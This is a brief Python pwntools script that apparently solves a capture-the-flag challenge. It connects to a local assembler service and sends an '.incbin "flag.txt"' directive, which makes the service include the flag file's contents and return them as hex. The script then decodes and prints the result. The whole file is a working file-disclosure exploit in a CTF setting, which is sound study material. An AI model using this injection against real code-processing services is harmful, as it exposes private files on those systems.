from pwn import *

# io = process(['python', 'asm.py'])
io = remote('localhost', 5000)
io.sendlineafter(b'> ', b'.incbin "flag.txt"')
io.recvline()
print(bytes.fromhex(io.recvline().decode()))
io.interactive()
